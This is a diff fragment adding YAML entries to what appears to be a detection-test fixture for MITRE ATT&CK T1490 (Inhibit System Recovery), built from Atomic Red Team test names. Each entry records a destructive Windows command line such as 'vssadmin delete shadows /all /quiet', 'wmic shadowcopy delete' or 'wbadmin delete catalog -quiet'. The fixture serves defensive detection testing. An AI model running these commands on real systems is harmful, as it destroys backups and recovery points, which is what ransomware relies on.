+  command_line: vssadmin.exe delete shadows /all /quiet
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b05
+  technique: T1490
+  art_test: Windows - Delete Volume Shadow Copies via WMI
+  image: C:\Windows\System32\wmic.exe
+  command_line: wmic.exe shadowcopy delete
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b06
+  technique: T1490
+  art_test: Windows - wbadmin Delete Windows Backup Catalog
+  image: C:\Windows\System32\wbadmin.exe
+  command_line: wbadmin delete catalog -quiet
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b07
+  technique: T1490
+  art_test: Windows - vssadmin Resize Shadowstorage Volume
+  image: C:\Windows\System32\vssadmin.exe
+  command_line: 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'
+  parent_image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
